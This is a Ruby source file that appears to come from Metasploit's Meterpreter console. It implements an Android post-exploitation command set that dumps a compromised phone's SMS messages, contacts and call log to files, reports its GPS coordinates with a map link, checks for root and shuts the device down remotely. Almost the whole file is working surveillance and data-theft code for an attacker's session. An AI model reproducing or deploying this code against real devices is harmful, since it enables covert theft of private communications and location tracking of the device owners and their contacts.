# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###

class Console::CommandDispatcher::Android

  Klass = Console::CommandDispatcher::Android
  include Console::CommandDispatcher

  def initialize(shell)
    super
  end

  #
  # List of supported commands.
  #
 def commands
    all = {
      "dump_sms"          => "Get sms messages",
      "dump_contacts"     => "Get contacts list",
      "geolocate"         => "Get current lat-long using geolocation",
      "dump_calllog"      => "Get call log",
      "check_root"        => "Check if device is rooted",
      "device_shutdown"   => "Shutdown device"
    }

    reqs = {
      "dump_sms"   		=> [ "dump_sms" ],
      "dump_contacts" => [ "dump_contacts"],
      "geolocate"   	=> [ "geolocate"],
      "dump_calllog"  => [ "dump_calllog"],
      "check_root"    => [ "check_root"],
      "device_shutdown" => [ "device_shutdown"]
    }

    all.delete_if do |cmd, desc|
      del = false
      reqs[cmd].each do |req|
        next if client.commands.include? req
        del = true
        break
      end

      del
    end

    all
  end

  def cmd_device_shutdown(*args)

    seconds = 0
    device_shutdown_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-t" => [ false, "Shutdown after n seconds"]
    )

    device_shutdown_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: device_shutdown [options]\n" )
        print_line( "Shutdown device." )
        print_line( device_shutdown_opts.usage )
        return
      when "-t"
        seconds = val
      end
    }

    res = client.android.device_shutdown(seconds)

    if res == true
      print_status("Device will shutdown #{seconds > 0 ?("after " + seconds + "seconds"):"now"}")
    else
      print_error("Device shutdown failed")
    end
  end
  
  def cmd_dump_sms(*args)

    path    = "sms_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_sms_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for sms list"]
      )

    dump_sms_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_sms [options]\n" )
        print_line( "Get sms messages." )
        print_line( dump_sms_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    smsList = Array.new
    smsList = client.android.dump_sms

    if smsList.count > 0
      print_status( "Fetching #{smsList.count} sms #{smsList.count == 1? 'message': 'messages'}" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n=====================\n")
          fd.write("[+] Sms messages dump\n")
          fd.write("=====================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          smsList.each_with_index { |a, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")

              type = "Unknown"
              if a['type'] == "1"
                type = "Incoming"
              elsif a['type'] == "2"
                type = "Outgoing"
              end

              status = "Unknown"
              if a['status'] == "-1"
                status = "NOT_RECEIVED"
              elsif a['status'] == "1"
                status = "SME_UNABLE_TO_CONFIRM"
              elsif a['status'] == "0"
                status = "SUCCESS"
              elsif a['status'] == "64"
                status = "MASK_PERMANENT_ERROR"
              elsif a['status'] == "32"
                status = "MASK_TEMPORARY_ERROR"
              elsif a['status'] == "2"
                status = "SMS_REPLACED_BY_SC"
              end

              fd.write("Type\t: #{type}\n")

              time = a['date'].to_i / 1000
              time = Time.at(time)

              fd.write("Date\t: #{time.strftime("%Y-%m-%d %H:%M:%S")}\n")
              fd.write("Address\t: #{a['address']}\n")
              fd.write("Status\t: #{status}\n")
              fd.write("Message\t: #{a['body']}\n\n")
          }
        end

        path = ::File.expand_path( path )

        print_status( "Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting messages")
        return false
      end
    else
      print_status( "No sms messages were found!" )
      return false
    end
  end


  def cmd_dump_contacts(*args)

    path    = "contacts_dump_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_contacts_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for contacts list"]

      )

    dump_contacts_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_contacts [options]\n" )
        print_line( "Get contacts list." )
        print_line( dump_contacts_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    contactList = Array.new
    contactList = client.android.dump_contacts

    if contactList.count > 0
      print_status( "Fetching #{contactList.count} #{contactList.count == 1? 'contact': 'contacts'} into list" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n======================\n")
          fd.write("[+] Contacts list dump\n")
          fd.write("======================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          contactList.each_with_index { |c, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")
              fd.write("Name\t: #{c['name']}\n")

              if c['number'].count > 0
                (c['number']).each { |n|
                  fd.write("Number\t: #{n}\n")
                }
              end

              if c['email'].count > 0
                (c['email']).each { |n|
                  fd.write("Email\t: #{n}\n")
                }
              end

              fd.write("\n")
          }
        end

        path = ::File.expand_path( path )
        print_status( "Contacts list saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting contacts list")
        return false
      end
    else
      print_status( "No contacts were found!" )
      return false
    end
  end

  def cmd_geolocate(*args)

    generate_map = false
    geolocate_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-g" => [ false, "Generate map using google-maps"]

      )

    geolocate_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: geolocate [options]\n" )
        print_line( "Get current location using geolocation." )
        print_line( geolocate_opts.usage )
        return
      when "-g"
        generate_map = true
      end
    }

    geo = client.android.geolocate

    print_status("Current Location:\n")
    print_line("\tLatitude  : #{geo[0]['lat']}")
    print_line("\tLongitude : #{geo[0]['long']}\n")
    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat']},#{geo[0]['long']}&sensor=true\n")


    if generate_map
      link = "https://maps.google.com/maps?q=#{geo[0]['lat']},#{geo[0]['long']}"
      print_status("Generated map on google-maps:")
      print_status("#{link}")
      Rex::Compat.open_browser(link)
    end

  end

  def cmd_dump_calllog(*args)

    path = "dump_calllog_" + Rex::Text.rand_text_alpha(8) + ".txt"
    dump_calllog_opts = Rex::Parser::Arguments.new(

      "-h" => [ false, "Help Banner" ],
      "-o" => [ false, "Output path for call log"]

      )

    dump_calllog_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: dump_calllog [options]\n" )
        print_line( "Get call log." )
        print_line( dump_calllog_opts.usage )
        return
      when "-o"
        path = val
      end
    }

    log = Array.new
    log = client.android.dump_calllog

    if log.count > 0
      print_status( "Fetching #{log.count} #{log.count == 1? 'entry': 'entries'}" )
      begin
        info = client.sys.config.sysinfo

        ::File.open( path, 'wb' ) do |fd|

          fd.write("\n=================\n")
          fd.write("[+] Call log dump\n")
          fd.write("=================\n\n")

          time = Time.new
          fd.write("Date: #{time.inspect}\n")
          fd.write("OS: #{info['OS']}\n")
          fd.write("Remote IP: #{client.sock.peerhost}\n")
          fd.write("Remote Port: #{client.sock.peerport}\n\n")

          log.each_with_index { |a, index|

              fd.write("##{(index.to_i + 1).to_s()}\n")

              fd.write("Number\t: #{a['number']}\n")
              fd.write("Name\t: #{a['name']}\n")
              fd.write("Date\t: #{a['date']}\n")
              fd.write("Type\t: #{a['type']}\n")
              fd.write("Duration: #{a['duration']}\n\n")
          }
        end

        path = ::File.expand_path( path )
        print_status( "Call log saved to: #{path}" )
        Rex::Compat.open_file( path )

        return true
      rescue
        print_error("Error getting call log")
        return false
      end
    else
      print_status( "No call log entries were found!" )
      return false
    end
  end


  def cmd_check_root(*args)

    check_root_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ]
      )

    check_root_opts.parse( args ) { | opt, idx, val |
      case opt
      when "-h"
        print_line( "Usage: check_root [options]\n" )
        print_line( "Check if device is rooted." )
        print_line( check_root_opts.usage )
        return
      end
    }

    isRooted = client.android.check_root

    if isRooted == true
      print_status("Device is rooted")
    elsif
      print_status("Device is not rooted")
    end
  end

  #
  # Name for this dispatcher
  #
  def name
    "Android"
  end

end

end
end
end
end
